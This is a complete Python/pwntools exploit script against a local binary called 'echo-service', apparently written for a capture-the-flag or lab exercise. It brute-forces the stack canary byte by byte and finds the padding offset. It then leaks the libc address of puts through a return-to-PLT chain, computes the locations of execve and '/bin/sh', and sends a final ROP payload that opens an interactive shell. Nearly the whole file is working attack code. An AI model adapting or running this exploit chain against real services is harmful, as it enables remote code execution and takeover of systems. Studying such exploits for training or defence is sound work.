
from pwn import *
import sys

port = int(sys.argv[1])

indicator = 0
leading_trashes_lenght = 64
known_instance = ""

def get_canary():
	if known_instance:
		return known_instance
	
	canary = '\x00'
	for i in range(1, 4):
		for char in range(0, 256):
			if char == 10:
				continue
			current_line = "Searching %d canarys byte! Done aprox: %d percent" % (i, int(float(char) / float(256) * 100))
			print current_line + "\b" * (len(current_line) + 2),
			
			p = connect('localhost', port)
			p.recvline()
			canary_part = canary + chr(char)
			payload = 'a' * leading_trashes_lenght + canary_part
			try:
				p.sendline(payload)
				p.recvline()
				p.sendline(payload)
				p.recvline()
			except Exception:
				p.close()
				continue
			
			canary += chr(char)
			print 'Canary value on byte: %d is: %d' % (i, char)
			p.close()
			break
	return canary

canary = get_canary()

# written after random crashes (not necessary)
def test_kanarka(canary):
	print 'Rozpoczynam test kanarka.'
	payload = 'a' * leading_trashes_lenght + canary
	p = connect('localhost', port)
	no_error = True
	try:
		msg = "1 attempt!"
		p.sendline(payload)
		p.recvline()
		print msg,
		p.sendline(payload)
		p.recvline()
		print '\b' * (len(msg) + 3), 
		msg = "2 attempt!"
		print msg,
		p.sendline(payload)
		p.recvline()
		print '\b' * (len(msg) + 3), 
                msg = "3 attempt!"
                print msg,
		error = False
	except Exception:
		error = True
		print "\033[1;31mcanary not ok!\033[0m"
	
	if not error:
		print "\033[1;32mCanary ok!\033[0m"

test_kanarka(canary)

def after_canary_offset(canary):
	for i in range(1, 100):
		payload = 'a' * leading_trashes_lenght + canary + '\x00' * i
		p = connect('localhost', port)
		try:
			p.sendline(payload)
			p.recvline()
			p.sendline(payload)
			p.recvline()
			p.sendline(payload)
                        p.recvline()
			p.sendline(payload)
                        p.recvline()
		except Exception:
			return i - 1
		p.close()

can_off = after_canary_offset(canary)

elf_p = ELF('./echo-service/echo-service')
putsplt = elf_p.symbols['plt.puts']
putsgot = elf_p.symbols['got.puts']
pltexit = elf_p.symbols['plt.exit']
payload = 'a' * leading_trashes_lenght + canary + '\x00' * can_off 
payload += p32(putsplt) 
payload += p32(pltexit)
payload += p32(putsgot)

p = connect('localhost', port)
p.recvline()
p.sendline(payload)
p.recvline()
b = p.recv(4)

puts = u32(b)

libc_elf = elf_p.libc
puts_offset = libc_elf.symbols['puts']
libc_base = puts - puts_offset
execve_offset = libc_elf.symbols['execve']
execve = libc_base + execve_offset
binsh_offset = list(libc_elf.search('/bin/sh'))[0]
binsh = libc_base + binsh_offset

final_payload = 'a' * 64 + canary + '\x00' * can_off + p32(execve) 
final_payload += p32(0) + p32(binsh) + p32(0) + p32(0)
p = connect('localhost', port)
p.sendline(final_payload)

p.interactive()
